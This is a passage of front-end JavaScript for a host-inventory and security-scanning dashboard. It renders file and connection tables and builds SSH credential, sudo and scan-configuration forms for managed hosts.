    pane.innerHTML = `<div class="empty">Loading files…</div>`;
    try {
      const pack = await api(`/v1/hosts/${hostId}/files?${hostInventoryScanQuery(opts)}`);
      const rows = pack.files || [];
      if (!rows.length) {
        pane.innerHTML = virt
          ? `<div class="empty">No file rows for this scan. Try another inventory scan, or <strong>Update</strong> with file JSONL.</div>`
          : `<div class="empty">No file inventory for this scan. Pick another scan above, or run a scan that collects file metadata.</div>`;
        return;
      }
      const src = pack.source === "virtual_ingest"
        ? "ingest JSONL"
        : (pack.scan_id ? `scan ${shortId(pack.scan_id)}` : "store");
      const renderRows = (filterQ = "") => {
        const q = String(filterQ || "").toLowerCase().trim();
        const shown = !q ? rows : rows.filter((f) => {
          const hay = [
            pathBytes(f.path) || f.path,
            f.owner, f.group, f.mode, f.mode_octal, f.permissions,
            f.machine_id, ...(f.flags || []),
            String(f.uid ?? ""), String(f.gid ?? ""), String(f.size ?? ""),
            String(f.inode?.s || f.inode || ""),
          ].join(" ").toLowerCase();
          return hay.includes(q);
        });
        return `
        <div class="toolbar" style="margin-bottom:0.55rem;gap:0.45rem">
          <input id="hostFileQ" type="search" placeholder="Filter by path, owner, mode…" value="${esc(filterQ)}" style="min-width:14rem" />
          <span class="muted" style="font-size:0.78rem">${shown.length.toLocaleString()} / ${rows.length.toLocaleString()} · ${esc(src)}</span>
        </div>
        <table class="data"><thead><tr>
          <th>Path</th><th>Size</th><th>Mode</th><th>Owner</th><th>Group</th><th>UID</th><th>GID</th><th>Inode</th><th>Flags</th>
        </tr></thead><tbody>
          ${shown.slice(0, 5000).map((f) => {
            const p = pathBytes(f.path) || f.path || "—";
            const modeDisp = f.mode_octal
              || (typeof f.mode === "number" ? (f.mode & 0o7777).toString(8).padStart(4, "0") : (f.mode ?? f.permissions ?? "—"));
            const sizeVal = f.size?.s ?? f.size ?? "—";
            const inodeVal = f.inode?.s ?? f.inode ?? "—";
            const owner = f.owner || (f.uid != null ? `uid:${f.uid}` : "—");
            const group = f.group
              || (f.gid === 0 ? "root" : null)
              || (f.gid != null ? `gid:${f.gid}` : "—");
            const flags = Array.isArray(f.flags) ? f.flags : [
              f.setuid ? "setuid" : null,
              f.setgid ? "setgid" : null,
              f.immutable ? "immutable" : null,
            ].filter(Boolean);
            return `<tr>
              <td class="mono" title="${esc(p)}">${esc(String(p).length > 72 ? String(p).slice(0, 72) + "…" : p)}</td>
              <td class="mono">${esc(sizeVal)}</td>
              <td class="mono">${esc(modeDisp)}</td>
              <td class="mono">${esc(owner)}</td>
              <td class="mono">${esc(group)}</td>
              <td class="mono">${esc(f.uid ?? "—")}</td>
              <td class="mono">${esc(f.gid ?? "—")}</td>
              <td class="mono">${esc(inodeVal)}</td>
              <td>${flags.length ? flags.map((x) => `<span class="tag">${esc(x)}</span>`).join(" ") : "—"}</td>
            </tr>`;
          }).join("")}
        </tbody></table>
        ${shown.length > 5000 ? `<div class="muted" style="margin-top:0.45rem">Showing first 5,000 of ${shown.length.toLocaleString()}</div>` : ""}`;
      };
      pane.innerHTML = renderRows("");
      const wire = () => {
        const qEl = $("#hostFileQ");
        let t = 0;
        qEl?.addEventListener("input", () => {
          clearTimeout(t);
          t = setTimeout(() => {
            const v = qEl.value || "";
            pane.innerHTML = renderRows(v);
            wire();
            const again = $("#hostFileQ");
            if (again) {
              again.focus();
              try { again.setSelectionRange(v.length, v.length); } catch (_) {}
            }
          }, 100);
        });
      };
      wire();
    } catch (err) {
      pane.innerHTML = `<div class="empty">${esc(err.message || "Failed to load files")}</div>`;
    }
  }

  async function loadHostConnections(hostId, opts) {
    const pane = $("#hostConnectionsPane");
    if (!pane) return;
    const virt = !!(opts && opts.virtual);
    pane.innerHTML = `<div class="empty">Loading connections…</div>`;
    try {
      const pack = await api(`/v1/hosts/${hostId}/connections?${hostInventoryScanQuery(opts)}`);
      const rows = pack.connections || [];
      if (!rows.length) {
        pane.innerHTML = virt
          ? `<div class="empty">No socket inventory for this scan. Try another inventory scan or import a PulseSecure tree.</div>`
          : `<div class="empty">No socket inventory for this scan. Pick another scan above, or run a scan that includes <span class="mono">net.sockets</span>.</div>`;
        return;
      }
      pane.innerHTML = `
        <div class="muted" style="margin-bottom:0.5rem">${rows.length.toLocaleString()} connections${pack.scan_id ? ` · scan ${esc(shortId(pack.scan_id))}` : ""}</div>
        <table class="data"><thead><tr>
          <th>Proto</th><th>State</th><th>Local</th><th>Remote</th><th>PID</th><th>Comm</th><th>UID</th>
        </tr></thead><tbody>
          ${rows.map((s) => {
            const local = `${s.local_ip || "?"}:${s.local_port ?? "?"}`;
            const remote = `${s.remote_ip || "?"}:${s.remote_port ?? "?"}`;
            const owner = s.owning_pid != null
              ? String(s.owning_pid)
              : (s.owner_unresolved ? "orphan" : "—");
            return `<tr>
              <td class="mono">${esc((s.protocol || "").toUpperCase())}/${esc(s.family || "")}</td>
              <td class="mono">${esc(s.state || "—")}</td>
              <td class="mono">${esc(local)}</td>
              <td class="mono">${esc(remote)}</td>
              <td class="mono">${esc(owner)}</td>
              <td class="mono">${esc(s.owning_comm || "—")}</td>
              <td class="mono">${esc(s.uid ?? "—")}</td>
            </tr>`;
          }).join("")}
        </tbody></table>`;
    } catch (err) {
      pane.innerHTML = `<div class="empty">${esc(err.message || "Failed to load connections")}</div>`;
    }
  }

  function showEditHost(id) {
    const h = state.hosts.find((x) => x.id === id);
    if (!h) {
      toast("Host not found");
      return;
    }
    const labels = h.labels || {};
    const timeouts = h.timeouts || {};
    openModal("Update host", `
      <form class="form" id="editHostForm">
        <label>Display name
          <input name="display_name" required value="${esc(h.display_name)}" />
        </label>
        <label>Primary address
          <input name="primary_addr" value="${esc(h.primary_addr || "")}" />
        </label>
        <div class="form-row">
          <label>SSH port
            <input name="ssh_port" type="number" min="1" max="65535" value="${esc(h.ssh_port || 22)}" />
          </label>
          <label>Credential ref
            <input name="credential" placeholder="vault://ssh/prod" value="${esc(labels.credential || "")}" />
          </label>
          <label>SSH username
            <input name="ssh_user" placeholder="root" value="${esc(labels.ssh_user || "")}" />
          </label>
        </div>
        ${sshAuthFieldsHtml({
          method: labels.ssh_auth === "password" || labels.ssh_password_file ? "password" : "publickey",
          identityName: "ssh_identity",
          identityFileId: "editHostIdentityFile",
          identityValue: labels.ssh_identity || "",
          passwordFileValue: labels.ssh_password_file || "",
          passwordPlaceholder: labels.ssh_password_file ? "Leave blank to keep saved password" : "SSH password",
          idPrefix: "editSshAuth",
          sudoEnabled: ["1", "true", "yes", "on"].includes(String(labels.ssh_sudo || "").toLowerCase()),
          sudoMode: labels.ssh_sudo_mode || (labels.ssh_password_file ? "ssh_password" : "nopasswd"),
          sudoPasswordFileValue: labels.ssh_sudo_password_file || "",
        })}
        ${String(h.agent_kind || "").toLowerCase() !== "virtual" ? `
        <label>Agent
          <select name="agent_kind">
            <option value="ssh" ${!isAgentLiteHost(h) ? "selected" : ""}>SSH probe (ephemeral binary)</option>
            <option value="agentlite" ${isAgentLiteHost(h) ? "selected" : ""}>AgentLite (SSH commands only, no binary)</option>
          </select>
        </label>
        <p class="muted" style="margin:0.25rem 0 0.75rem;font-size:0.75rem">
          AgentLite never copies a probe onto the host — collection uses read-only SSH shell commands (sudo when configured). Coverage is lower; scans raise RM-POL-0021.
        </p>` : ""}
        <div class="form-row">
          <label>Env
            <input name="env" value="${esc(labels.env || "")}" />
          </label>
          <label>Profile
            <input name="profile" value="${esc(labels.profile || "")}" />
          </label>
          <label>Region
            <input name="region" value="${esc(labels.region || "")}" />
          </label>
        </div>
        <label>Tags (comma-separated)
          <input name="tags" value="${esc(labels.tags || "")}" />
        </label>
        <div class="form-row">
          <label>Preferred check set
            <select name="check_set">
              <option value="">Fleet default (${esc(state.settings?.effective?.default_check_set || "standard")})</option>
              ${CHECK_SETS.map((s) => `<option value="${esc(s.id)}" ${(labels.check_set || labels.default_check_set) === s.id ? "selected" : ""}>${esc(s.title)}</option>`).join("")}
            </select>
          </label>
          <label>Scan interval
            <select name="scan_interval">
              ${scanIntervalOptionsHtml(labels.scan_interval || "manual")}
            </select>
          </label>
          <label>Scan history keep
            <select name="scan_history">
              <option value="">Fleet default (${esc(String(state.settings?.effective?.scan_history_per_host ?? 3))})</option>
              ${[1,3,5,10,20,50].map((v) => `<option value="${v}" ${String(labels.scan_history || labels.scan_history_per_host || "") === String(v) ? "selected" : ""}>${v}</option>`).join("")}
            </select>
          </label>
        </div>
        <div class="form-row">
          <label>Connect timeout (s)
            <input name="connect_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.connect_timeout_secs ?? "")}" />
          </label>
          <label>Auth timeout (s)
            <input name="auth_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.auth_timeout_secs ?? "")}" />
          </label>
          <label>Command timeout (s)
            <input name="cmd_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.cmd_timeout_secs ?? "")}" />
          </label>
        </div>
        <div class="form-row">
          <label>Inactivity timeout (s)
            <input name="inactivity_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.inactivity_timeout_secs ?? "")}" />
          </label>
          <label>Delivery timeout (s)
            <input name="delivery_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.delivery_timeout_secs ?? "")}" />
          </label>
          <label>Scan timeout (s)
            <input name="scan_timeout_secs" type="number" min="0" placeholder="fleet default" value="${esc(timeouts.scan_timeout_secs ?? "")}" />
          </label>
        </div>
        <div class="form-row">
          <label>Connect delay (ms)
            <input name="connect_delay_ms" type="number" min="0" value="${esc(timeouts.connect_delay_ms ?? "")}" />
          </label>
        </div>
        ${String(h.agent_kind || "").toLowerCase() !== "virtual" ? `
        <div id="editHostCollectPaths" class="${isAgentLiteHost(h) ? "" : "hidden"}">
          <label>Extra file paths to inventory (AgentLite)
            <textarea name="collect_paths" rows="3" class="mono" placeholder="/opt/app&#10;/var/www&#10;/home/deploy/.ssh">${esc(labels.collect_paths || "")}</textarea>
          </label>
          <p class="muted" style="margin:0.25rem 0 0.75rem;font-size:0.75rem">
            Absolute files or directories (one per line, or comma-separated). Merged with AgentLite defaults (/bin, /usr/bin, /etc, /tmp, …). Directories are walked shallowly (depth ≤3).
          </p>
        </div>` : ""}
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Save</button>
        </div>
      </form>
    `);
    const editForm = $("#editHostForm");
    wireIdentityPicker("ssh_identity", "editHostIdentityFile");
    wireSshAuthMethodToggle(editForm);
    wireSshSudoToggle(editForm);
    const editAgentSel = editForm?.querySelector('select[name="agent_kind"]');
    const editPaths = $("#editHostCollectPaths");
    if (editAgentSel && editPaths) {
      const syncEditPaths = () => {
        editPaths.classList.toggle("hidden", String(editAgentSel.value || "") !== "agentlite");
      };
      editAgentSel.addEventListener("change", syncEditPaths);
      syncEditPaths();
    }
    editForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const labelsOut = { ...(h.labels || {}) };
      const setLabel = (k, v) => {
        const t = String(v || "").trim();
        if (t) labelsOut[k] = t;
        else delete labelsOut[k];
      };
      setLabel("env", fd.get("env"));
      setLabel("profile", fd.get("profile"));
      setLabel("region", fd.get("region"));
      setLabel("tags", fd.get("tags"));
      setLabel("credential", fd.get("credential"));
      setLabel("ssh_user", fd.get("ssh_user"));
      setLabel("check_set", fd.get("check_set"));
      applyAutoCollectFromForm(fd, labelsOut, { checkboxMode: false });
      setLabel("scan_history", fd.get("scan_history"));
      setLabel("collect_paths", fd.get("collect_paths"));
      delete labelsOut.default_check_set;
      delete labelsOut.scan_history_per_host;
      const auth = readSshAuthFromForm(fd);
      try {
        if (auth.method === "password") {
          labelsOut.ssh_auth = "password";
          delete labelsOut.ssh_identity;
          let pwFile = auth.passwordFile;
          if (auth.password) {
            pwFile = await storeSshPassword(auth.password, labelsOut.ssh_user || h.display_name || "ssh-password");
          }
          if (pwFile) labelsOut.ssh_password_file = pwFile;
          else delete labelsOut.ssh_password_file;
        } else {
          labelsOut.ssh_auth = "publickey";
          delete labelsOut.ssh_password_file;
          setLabel("ssh_identity", auth.identity);
        }
        await applySshSudoFromForm(fd, labelsOut, labelsOut.ssh_user || h.display_name || "host");
      } catch (err) {
        toast(err.message);
        return;
      }
      const agentKind = String(fd.get("agent_kind") || h.agent_kind || "ssh").trim().toLowerCase();
      if (agentKind === "agentlite") {
        labelsOut.scan_mode = "ssh_commands";
      } else {
        delete labelsOut.scan_mode;
        delete labelsOut.collect_paths;
      }
      const numOrUndef = (v) => {
        const s = String(v ?? "").trim();
        if (!s) return undefined;
        const n = Number(s);
        return Number.isFinite(n) ? n : undefined;
      };
      try {
        await api(`/v1/hosts/${id}`, {
          method: "PATCH",
          body: {
            display_name: String(fd.get("display_name") || "").trim(),
            primary_addr: String(fd.get("primary_addr") || "").trim(),
            ssh_port: Number(fd.get("ssh_port") || 22),
            agent_kind: String(h.agent_kind || "").toLowerCase() === "virtual"
              ? undefined
              : (agentKind === "agentlite" ? "agentlite" : "ssh"),
            labels: labelsOut,
            timeouts: {
              connect_timeout_secs: numOrUndef(fd.get("connect_timeout_secs")),
              auth_timeout_secs: numOrUndef(fd.get("auth_timeout_secs")),
              cmd_timeout_secs: numOrUndef(fd.get("cmd_timeout_secs")),
              inactivity_timeout_secs: numOrUndef(fd.get("inactivity_timeout_secs")),
              delivery_timeout_secs: numOrUndef(fd.get("delivery_timeout_secs")),
              scan_timeout_secs: numOrUndef(fd.get("scan_timeout_secs")),
              connect_delay_ms: numOrUndef(fd.get("connect_delay_ms")),
            },
          },
        });
        closeModal();
        toast("Host updated");
        await loadAll();
      } catch (err) {
        toast(err.message);
      }
    });
  }

  async function deleteHosts(ids) {
    const list = [...ids];
    if (!list.length) return;
    const msg = list.length === 1
      ? `Delete host ${hostName(list[0])}? This removes its scans, findings, observations, virtual ingest files, and hunt events.`
      : `Delete ${list.length} hosts? This removes their scans, findings, observations, virtual ingest files, and hunt events.`;
    if (!window.confirm(msg)) return;
    try {
      if (list.length === 1) {
        await api(`/v1/hosts/${list[0]}`, { method: "DELETE" });
      } else {
        const res = await api("/v1/hosts/delete", {
          method: "POST",
          body: { host_ids: list },
        });
        toast(`Deleted ${res.deleted} host(s)${res.missing?.length ? ` · ${res.missing.length} missing` : ""}`);
        setSelectedHosts([]);
        await loadAll();
        closeDrawer();
        return;
      }
      toast("Host deleted");
      setSelectedHosts([...selectedHostIds()].filter((id) => id !== list[0]));
      await loadAll();
      closeDrawer();
    } catch (err) {
      toast(err.message);
    }
  }

  function checkSetOptionsHtml(selected = "standard") {
    return CHECK_SETS.map((s) => `
      <label class="check-set-card ${selected === s.id ? "active" : ""}">
        <input type="radio" name="check_set" value="${esc(s.id)}" ${selected === s.id ? "checked" : ""} />
        <span class="check-set-title">${esc(s.title)}</span>
        <span class="check-set-blurb muted">${esc(s.blurb)}</span>
      </label>
    `).join("");
  }

  function hostPreferredCheckSet(host) {
    const fromHost = host?.labels?.check_set || host?.labels?.default_check_set;
    if (fromHost && CHECK_SETS.some((s) => s.id === fromHost)) return fromHost;
    return state.settings?.effective?.default_check_set || "standard";
  }

  function showScanHosts(ids, defaultSet) {
    const list = [...ids].filter(Boolean);
    if (!list.length) return toast("No hosts selected");
    const single = list.length === 1 ? state.hosts.find((h) => h.id === list[0]) : null;
    const selected = defaultSet || hostPreferredCheckSet(single);
    openModal(list.length === 1 ? `Scan ${esc(single?.display_name || "host")}` : `Scan ${list.length} hosts`, `
      <form class="form" id="scanTypeForm">
        <p class="muted" style="margin:0 0 0.75rem;font-size:0.88rem">
          Choose a check set. Deeper sets take longer and collect more observations.
        </p>
        <div class="check-set-grid" id="checkSetGrid">
          ${checkSetOptionsHtml(selected)}
        </div>
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Start scan</button>
        </div>
      </form>
    `);
    const grid = $("#checkSetGrid");
    if (grid) {
      grid.addEventListener("change", () => {
        $$(".check-set-card", grid).forEach((card) => {
          const input = card.querySelector('input[type="radio"]');
          card.classList.toggle("active", !!(input && input.checked));
        });
      });
    }
    $("#scanTypeForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const checkSet = String(fd.get("check_set") || "standard");
      closeModal();
      await scanHosts(list, checkSet);
    });
  }

  async function scanHosts(ids, checkSet = "standard") {
    let ok = 0;
    let fail = 0;
    for (const id of ids) {
      try {
        await api(`/v1/hosts/${id}/scan`, {
          method: "POST",
          body: { check_set: checkSet, priority: 100 },
        });
        ok += 1;
      } catch (_) {
        fail += 1;
      }
    }
    toast(`Queued ${ok} ${checkSet} scan(s)${fail ? ` · ${fail} skipped (busy/error)` : ""}`);
    await loadAll();
    if (ok) setView("queue");
  }

  function showTagSelected() {
    const ids = [...selectedHostIds()];
    if (!ids.length) return;
    openModal(`Tag ${ids.length} host(s)`, `
      <form class="form" id="tagHostsForm">
        <label>Tags to merge (comma-separated)
          <input name="tags" placeholder="pci, linux, jump" required />
        </label>
        <label>Env (optional)
          <input name="env" placeholder="prod" />
        </label>
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Apply tags</button>
        </div>
      </form>
    `);
    $("#tagHostsForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const tags = String(fd.get("tags") || "").trim();
      const env = String(fd.get("env") || "").trim();
      let n = 0;
      for (const id of ids) {
        const h = state.hosts.find((x) => x.id === id);
        if (!h) continue;
        const patch = {};
        if (env) patch.env = env;
        if (tags) {
          const existing = String(h.labels?.tags || "")
            .split(/[,;]+/)
            .map((t) => t.trim())
            .filter(Boolean);
          const next = [...new Set([...existing, ...tags.split(/[,;]+/).map((t) => t.trim()).filter(Boolean)])];
          patch.tags = next.join(",");
        }
        await api(`/v1/hosts/${id}`, { method: "PATCH", body: { label_patch: patch } });
        n += 1;
      }
      closeModal();
      toast(`Tagged ${n} host(s)`);
      await loadAll();
    });
  }

  function exportHostsCsv() {
    const rows = filteredHosts();
    const header = ["id", "display_name", "agent", "agent_detail", "primary_addr", "ssh_port", "os", "os_id", "os_version", "arch", "kernel", "status", "last_outcome", "last_scan_at", "env", "profile", "region", "tags"];
    const lines = [header.join(",")];
    for (const h of rows) {
      const st = hostStatus(h);
      const agent = hostAgentInfo(h);
      const cells = [
        h.id,
        h.display_name,
        agent.title,
        agent.detail,
        h.primary_addr || "",
        h.ssh_port || 22,
        h.os || "",
        h.os_id || "",
        h.os_version || "",
        h.arch || "",
        h.kernel || "",
        st.label,
        h.last_outcome || "",
        h.last_scan_at || "",
        h.labels?.env || "",
        h.labels?.profile || "",
        h.labels?.region || "",
        h.labels?.tags || "",
      ].map((v) => `"${String(v).replace(/"/g, '""')}"`);
      lines.push(cells.join(","));
    }
    const blob = new Blob([lines.join("\n")], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `rustmite-hosts-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
    toast(`Exported ${rows.length} host(s)`);
  }

  function wireHostActionButtons(root) {
    const scope = root || document;
    $$("[data-scan-host]", scope).forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.stopPropagation();
        showScanHosts([btn.dataset.scanHost]);
      });
    });
    $$("[data-edit-host]", scope).forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.stopPropagation();
        closeDrawer();
        showEditHost(btn.dataset.editHost);
      });
    });
    $$("[data-delete-host]", scope).forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.stopPropagation();
        await deleteHosts([btn.dataset.deleteHost]);
      });
    });
  }

  async function uploadIdentityFile(file) {
    if (!file) throw new Error("No file selected");
    const pem = await file.text();
    const res = await api("/v1/credentials/ssh-identity", {
      method: "POST",
      body: { name: file.name || "id_ed25519", pem },
    });
    return res.path;
  }

  function wireIdentityPicker(inputName, fileInputId) {
    const fileInput = document.getElementById(fileInputId);
    const pathInput = formFieldByName(inputName);
    if (!fileInput || !pathInput) return;
    fileInput.addEventListener("change", async () => {
      const file = fileInput.files && fileInput.files[0];
      if (!file) return;
      try {
        pathInput.value = await uploadIdentityFile(file);
        toast(`Key sealed for nodes (not readable again) → ${pathInput.value}`);
      } catch (err) {
        toast(err.message);
      } finally {
        fileInput.value = "";
      }
    });
  }

  function formFieldByName(name, root = document) {
    return root.querySelector(`[name="${name}"]`);
  }

  function identityPickerHtml(inputName, fileId, value = "") {
    return `
      <label>Identity key (sealed in database)
        <div class="identity-pick">
          <input name="${esc(inputName)}" id="${esc(inputName)}Path" placeholder="credential id or pick a file" value="${esc(value)}" />
          <label class="btn ghost identity-pick-btn" for="${esc(fileId)}">Choose file</label>
          <input type="file" id="${esc(fileId)}" class="identity-file" accept=".pem,.key" />
        </div>
      </label>`;
  }

  function sshAuthFieldsHtml({
    method = "publickey",
    identityName = "identity",
    identityFileId = "addHostIdentityFile",
    identityValue = "",
    passwordFileValue = "",
    passwordPlaceholder = "SSH password",
    idPrefix = "sshAuth",
    sudoEnabled = false,
    sudoMode = "ssh_password",
    sudoPasswordFileValue = "",
  } = {}) {
    const isPw = method === "password";
    return `
      <fieldset class="ssh-auth-fields" style="border:0;margin:0;padding:0">
        <legend style="font-size:0.85rem;margin-bottom:0.25rem">SSH auth method</legend>
        <div class="ssh-auth-method" role="radiogroup" aria-label="SSH auth method">
          <label>
            <input type="radio" name="ssh_auth" value="publickey" ${!isPw ? "checked" : ""} data-ssh-auth-radio />
            Public key
          </label>
          <label>
            <input type="radio" name="ssh_auth" value="password" ${isPw ? "checked" : ""} data-ssh-auth-radio />
            Password
          </label>
        </div>
        <div id="${esc(idPrefix)}KeyBlock" class="ssh-auth-pane ${isPw ? "hidden" : ""}" data-ssh-auth-pane="publickey">
          ${identityPickerHtml(identityName, identityFileId, identityValue)}
        </div>
        <div id="${esc(idPrefix)}PasswordBlock" class="ssh-auth-pane ${isPw ? "" : "hidden"}" data-ssh-auth-pane="password">
          <label>SSH password
            <input name="ssh_password" type="password" autocomplete="new-password" placeholder="${esc(passwordPlaceholder)}" />
          </label>
          <input type="hidden" name="ssh_password_file" value="${esc(passwordFileValue)}" />
          ${passwordFileValue
            ? `<p class="muted" style="margin:0.35rem 0 0;font-size:0.75rem">A password is already saved — leave blank to keep it.</p>`
            : ""}
        </div>
        ${sshSudoFieldsHtml({
          enabled: sudoEnabled,
          mode: sudoMode,
          passwordFileValue: sudoPasswordFileValue,
          idPrefix: `${idPrefix}Sudo`,
        })}
      </fieldset>`;
  }

  function sshSudoFieldsHtml({
    enabled = false,
    mode = "ssh_password",
    passwordFileValue = "",
    idPrefix = "sshSudo",
  } = {}) {
    const m = mode || "ssh_password";
    return `
      <div class="ssh-sudo-fields" style="margin-top:0.75rem;padding-top:0.65rem;border-top:1px solid var(--line)">
        <label style="display:flex;align-items:center;gap:0.45rem;font-weight:600">
          <input type="checkbox" name="ssh_sudo" value="1" ${enabled ? "checked" : ""} data-ssh-sudo-toggle />
          Escalate with sudo (root)
        </label>
        <p class="muted" style="margin:0.35rem 0 0.5rem;font-size:0.75rem">
          Required for <span class="mono">/etc/shadow</span>, other users' keys, and reliable <span class="mono">/proc</span> reads when SSH is a non-root user (applies to SSH probe and AgentLite scans).
        </p>
        <div data-ssh-sudo-pane class="${enabled ? "" : "hidden"}">
          <label>Sudo mode
            <select name="ssh_sudo_mode" data-ssh-sudo-mode>
              <option value="ssh_password" ${m === "ssh_password" ? "selected" : ""}>Reuse SSH password</option>
              <option value="nopasswd" ${m === "nopasswd" ? "selected" : ""}>NOPASSWD (sudo -n)</option>
              <option value="password" ${m === "password" ? "selected" : ""}>Separate sudo password</option>
            </select>
          </label>
          <div data-ssh-sudo-pw-pane class="${m === "password" ? "" : "hidden"}" style="margin-top:0.5rem">
            <label>Sudo password
              <input name="ssh_sudo_password" type="password" autocomplete="new-password" placeholder="${esc(passwordFileValue ? "Leave blank to keep saved sudo password" : "sudo password")}" />
            </label>
            <input type="hidden" name="ssh_sudo_password_file" value="${esc(passwordFileValue)}" />
          </div>
        </div>
      </div>`;
  }

  function wireSshSudoToggle(form) {
    if (!form) return;
    const toggle = form.querySelector("[data-ssh-sudo-toggle]");
    const pane = form.querySelector("[data-ssh-sudo-pane]");
    const modeSel = form.querySelector("[data-ssh-sudo-mode]");
    const pwPane = form.querySelector("[data-ssh-sudo-pw-pane]");
    if (!toggle || !pane) return;
    const sync = () => {
      const on = !!toggle.checked;
      pane.classList.toggle("hidden", !on);
      pane.hidden = !on;
      if (pwPane && modeSel) {
        const showPw = on && modeSel.value === "password";
        pwPane.classList.toggle("hidden", !showPw);
        pwPane.hidden = !showPw;
      }
    };
    toggle.addEventListener("change", sync);
    if (modeSel) modeSel.addEventListener("change", sync);
    sync();
  }

  async function applySshSudoFromForm(fd, labelsOut, nameHint) {
    const enabled = String(fd.get("ssh_sudo") || "") === "1";
    if (!enabled) {
      delete labelsOut.ssh_sudo;
      delete labelsOut.ssh_sudo_mode;
      delete labelsOut.ssh_sudo_password_file;
      return;
    }
    labelsOut.ssh_sudo = "true";
    const mode = String(fd.get("ssh_sudo_mode") || "ssh_password").trim() || "ssh_password";
    labelsOut.ssh_sudo_mode = mode;
    if (mode === "password") {
      let pwFile = String(fd.get("ssh_sudo_password_file") || "").trim();
      const pw = String(fd.get("ssh_sudo_password") || "");
      if (pw) {
        pwFile = await storeSshPassword(pw, `${nameHint || "host"}-sudo`);
      }
      if (pwFile) labelsOut.ssh_sudo_password_file = pwFile;
      else delete labelsOut.ssh_sudo_password_file;
    } else {
      delete labelsOut.ssh_sudo_password_file;
    }
  }

  function wireSshAuthMethodToggle(form) {
    if (!form) return;
    const radios = [...form.querySelectorAll('[data-ssh-auth-radio], input[name="ssh_auth"]')];
    const panes = [...form.querySelectorAll("[data-ssh-auth-pane]")];
    if (!radios.length || !panes.length) return;
    const sync = () => {
      const checked = form.querySelector('input[name="ssh_auth"]:checked');
      const method = checked ? checked.value : "publickey";
      panes.forEach((pane) => {
        const show = pane.getAttribute("data-ssh-auth-pane") === method;
        pane.classList.toggle("hidden", !show);
        pane.hidden = !show;
        pane.querySelectorAll("input:not([type=hidden]), select, textarea").forEach((el) => {
          el.disabled = !show;
        });
      });
    };
    radios.forEach((r) => r.addEventListener("change", sync));
    sync();
  }

  async function storeSshPassword(password, nameHint = "ssh-password") {
    const res = await api("/v1/credentials/ssh-password", {
      method: "POST",
      body: { name: nameHint, password },
    });
    return res.path;
  }

  function readSshAuthFromForm(fd) {
    const method = String(fd.get("ssh_auth") || "publickey").trim() || "publickey";
    const identity = String(fd.get("identity") || fd.get("ssh_identity") || "").trim();
    const password = String(fd.get("ssh_password") || "");
    const passwordFile = String(fd.get("ssh_password_file") || "").trim();
    return { method, identity, password, passwordFile };
  }

  function renderTestReport(report) {
    const stages = report.stages || [];
    const status = report.auth_status || (report.ok ? "ok" : "failed");
    const cls = report.ok ? "ok" : "bad";
    const methodHint = report.auth_method ? ` via ${report.auth_method}` : "";
    return `
      <div class="conn-test ${cls}">
        <div class="conn-test-head">
          <strong>${report.ok ? `Connection looks good${methodHint}` : "Connection problem"}</strong>
          <span class="host-status ${report.ok ? "active" : "inactive"}">${esc(status)}</span>
        </div>
        <ol class="conn-stages">
          ${stages.map((s) => `<li class="${s.ok ? "ok" : "bad"}">
            <span class="mono">${esc(s.name)}</span>
            <span>${esc(s.detail)}</span>
            <span class="muted">${esc(String(s.duration_ms))}ms</span>
          </li>`).join("")}
        </ol>
        ${report.host_key_fingerprint ? `<div class="muted mono" style="font-size:0.78rem;margin-top:0.5rem">Host key ${esc(report.host_key_type || "")} ${esc(report.host_key_fingerprint)}</div>` : ""}
        ${report.os || report.kernel || report.arch ? `<div class="muted" style="font-size:0.78rem;margin-top:0.35rem">
          ${report.os ? `<div><strong>OS</strong> ${esc(report.os)}${report.os_id ? ` <span class="mono">(${esc([report.os_id, report.os_version].filter(Boolean).join(" "))})</span>` : ""}</div>` : ""}
          <div class="mono">arch ${esc(report.arch || "—")} · kernel ${esc(report.kernel || "—")}</div>
        </div>` : (report.uname ? `<div class="muted mono" style="font-size:0.78rem">uname: ${esc(report.uname)}</div>` : "")}
        ${!report.ok && status === "no_credential" ? `<p class="muted" style="margin:0.65rem 0 0;font-size:0.85rem">Provide an SSH username and a public key or password, then test again before Finish.</p>` : ""}
      </div>`;
  }

  async function runHostConnectionTest(payload, resultEl) {
    if (resultEl) {
      resultEl.innerHTML = `<div class="conn-test"><div class="muted">Testing ${esc(payload.host)}:${payload.ssh_port || 22}…</div></div>`;
    }
    const report = await api("/v1/hosts/test", { method: "POST", body: payload });
    if (resultEl) resultEl.innerHTML = renderTestReport(report);
    return report;
  }

  function showAddHost() {
    openModal("Add hosts", `
      <form class="form" id="addHostForm">
        <p class="muted" style="margin:0 0 0.75rem;font-size:0.88rem">
          Choose an agent, then paste hostnames, IPs, or IPv4 CIDR netblocks.
          Use <strong>Test connection</strong> on the first host to verify SSH before Finish.
        </p>
        <fieldset class="ssh-auth-fields" style="border:0;margin:0 0 0.85rem;padding:0">
          <legend style="font-size:0.85rem;margin-bottom:0.25rem;font-weight:600">Agent</legend>
          <div class="ssh-auth-method" role="radiogroup" aria-label="Agent">
            <label title="Ephemeral probe binary over SSH (highest fidelity)">
              <input type="radio" name="agent_kind" value="ssh" checked data-add-agent />
              SSH probe
            </label>
            <label title="SSH shell commands only — no binary on the host">
              <input type="radio" name="agent_kind" value="agentlite" data-add-agent />
              AgentLite
            </label>
            <label title="Log ingest only — no SSH">
              <input type="radio" name="agent_kind" value="virtual" data-add-agent />
              Virtual
            </label>
          </div>
